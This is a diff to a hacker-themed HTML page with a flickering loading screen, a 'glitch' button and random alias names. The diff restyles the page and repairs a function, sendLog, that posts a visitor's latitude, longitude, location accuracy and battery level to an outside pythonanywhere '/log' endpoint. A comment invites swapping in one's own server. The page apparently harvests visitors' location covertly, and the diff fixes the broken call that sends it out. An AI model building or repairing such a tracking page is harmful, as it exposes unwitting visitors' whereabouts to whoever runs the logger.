@@ -7,7 +7,7 @@
   <style>
     body {
       background-color: black;
-      color: red;
+      color: #ff4d4d;
       font-family: monospace;
       display: flex;
       flex-direction: column;
@@ -18,10 +18,38 @@
       text-align: center;
       overflow: hidden;
     }
+    h1 {
+      font-size: 2.5em;
+      margin-bottom: 10px;
+      animation: flicker 1.5s infinite alternate;
+    }
+    .glitch-button {
+      border: 2px solid #ff4d4d;
+      padding: 15px 30px;
+      margin-top: 30px;
+      font-size: 1.2em;
+      cursor: pointer;
+      color: #ff4d4d;
+      background: black;
+      position: relative;
+      transition: background 0.3s, color 0.3s;
+    }
+    .glitch-button:hover {
+      background: #ff4d4d;
+      color: black;
+    }
+    #result {
+      margin-top: 25px;
+      font-size: 1.1em;
+      color: white;
+      z-index: 2;
+    }
     #loading {
       position: fixed;
+      top: 0;
+      left: 0;
       background-color: black;
-      color: red;
+      color: #ff4d4d;
       width: 100%;
       height: 100%;
       z-index: 99;
@@ -30,32 +58,6 @@
       justify-content: center;
       font-size: 1.5em;
       animation: flicker 1s infinite alternate;
-    }
-    h1 {
-      font-size: 2.7em;
-      margin-bottom: 10px;
-      animation: flicker 1.5s infinite alternate;
-    }
-    .glitch-button {
-      border: 2px solid red;
-      padding: 15px 30px;
-      margin-top: 30px;
-      font-size: 1.2em;
-      cursor: pointer;
-      color: red;
-      background: black;
-      position: relative;
-      transition: background 0.3s;
-    }
-    .glitch-button:hover {
-      background: red;
-      color: black;
-    }
-    #result {
-      margin-top: 25px;
-      font-size: 1.1em;
-      color: white;
-      z-index: 2;
     }
     @keyframes flicker {
       from { opacity: 1; }
@@ -77,13 +79,14 @@
     const loading = document.getElementById("loading");
     const randomNames = ["SatriaHitam", "HantuLangit", "Pengintai08", "X-Shadow", "404User", "SilentWolf", "DewaGelap"];
 
-    document.addEventListener("DOMContentLoaded", () => {
-  setTimeout(() => {
-    loading.style.display = "none";
-  }, 2000);
-});
+    window.onload = () => {
+      setTimeout(() => {
+        loading.remove(); // Fix tombol gak bisa dipencet
+      }, 2000);
+    };
+
     function sendLog(lat, lon, acc, battery) {
-      fetch("fetch("https://cobraanotdeveloper.pythonanywhere.com/log", {", {
+      fetch("https://cobraanotdeveloper.pythonanywhere.com/log", { // GANTI KE SERVERMU KALAU PERLU
         method: "POST",
         headers: {
           "Content-Type": "application/json",
